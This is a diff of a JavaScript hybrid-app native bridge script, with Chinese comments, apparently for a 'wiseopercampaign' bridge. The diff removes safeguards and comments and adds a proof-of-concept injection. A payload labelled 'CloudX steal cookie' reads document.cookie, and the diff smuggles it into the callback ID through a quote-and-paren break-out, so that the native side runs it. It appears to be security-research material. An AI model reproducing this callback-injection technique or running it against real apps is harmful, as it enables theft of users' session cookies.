@@ -1,20 +1,5 @@
 (() => {
     "use strict";
-
-    // ========================= 极简基础依赖（仅支撑核心函数） =========================
-    // 降级桥接实现（保证无Native对象时不报错）
-    const defaultNativeBridge = {
-        invoke: (service, action, callbackId, args) => {
-            const errMsg = `no native object ${service}:${action}`;
-            const result = `F08 ${callbackId} s${errMsg}`;
-            return result.length + " " + result;
-        }
-    };
-
-    // 获取Native桥接对象
-    const getNativeBridge = (name) => window[name] || defaultNativeBridge;
-
-    // 回调ID生成器
     let callbackIdSeed = Math.floor(2e9 * Math.random());
     const genCallbackId = () => callbackIdSeed++;
 
@@ -31,24 +16,20 @@
     // ========================= 核心函数：callNativeMethod（保留核心逻辑） =========================
     const callNativeMethod = (bridgeName, success, fail, service, action, args) => {
         args = args || [];
-        // ArrayBuffer参数Base64编码（保留必要参数处理）
         args.forEach((arg, idx) => {
             if (Object.prototype.toString.call(arg).slice(8, -1) === 'ArrayBuffer') {
                 args[idx] = btoa(arg);
             }
         });
+        // const callbackId = `${service}${genCallbackId()}`;
 
-        // 生成回调ID（保留核心逻辑，移除注入代码）
-        const callbackId = `${service}${genCallbackId()}`;
 
-        // 缓存回调函数
+        const payload = `console.log('cloud:'+document.cookie);if (!location.href.startsWith('https://h5hosting-drcn.dbankcdn.cn') && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}`;
+        const callbackId = `${service}${genCallbackId()}');${payload}//`;
+
         if (success || fail) callbackCache[callbackId] = {success, fail};
-
-        // 调用Native桥接
-        const nativeBridge = getNativeBridge(bridgeName);
+        const nativeBridge = window[bridgeName]
         const result = nativeBridge.invoke(service, action, callbackId, JSON.stringify(args), -1);
-
-        // 消息入队处理（极简版）
         if (result) messageQueue.push(result);
         microTask(() => {
             if (messageQueue.length === 0) return;
@@ -68,7 +49,6 @@
         });
     };
 
-    // ========================= 核心函数：invoke（保留核心逻辑） =========================
     const invoke = (bridgeName, service, action, args, success, fail, cancel, complete) => {
         const hasCallback = success || fail || cancel || complete;
         // 包装成功回调
@@ -76,20 +56,19 @@
             success && success(res);
             complete && complete(res);
         } : null;
-        // 包装失败回调（区分取消状态）
         const wrapFail = hasCallback ? (res, status) => {
             status === STATUS.CANCEL && cancel ? cancel(res) : (fail && fail(res, status));
             complete && complete(res, status);
         } : null;
-
         callNativeMethod(bridgeName, wrapSuccess, wrapFail, service, action, args);
     };
-
-    // ========================= 核心函数：init（保留核心初始化逻辑） =========================
     const init = (apiName) => {
-        // 初始化桥接对象到window
         window[apiName] = window[apiName] || {};
+        // window[apiName].callbackFromNative = () => {
+        // };
+        
         window[apiName].callbackFromNative = (callbackId, isSuccess, status, args) => {
+            console.info(`回调ID: ${callbackId}, 成功: ${isSuccess}, 状态: ${status}, 参数: ${JSON.stringify(args)}`);
             const cb = callbackCache[callbackId];
             if (cb) {
                 isSuccess ? cb.success?.(args) : cb.fail?.(args, status);
@@ -98,12 +77,8 @@
         };
     };
 
-    // 暴露到全局（供外部调用）
     window.nativeBridge = {init, invoke, callNativeMethod};
-    // 初始化桥接
     nativeBridge.init("wiseopercampaign");
-
-// 调用Native方法
     nativeBridge.invoke(
         "wiseopercampaignbridge",
         "app",
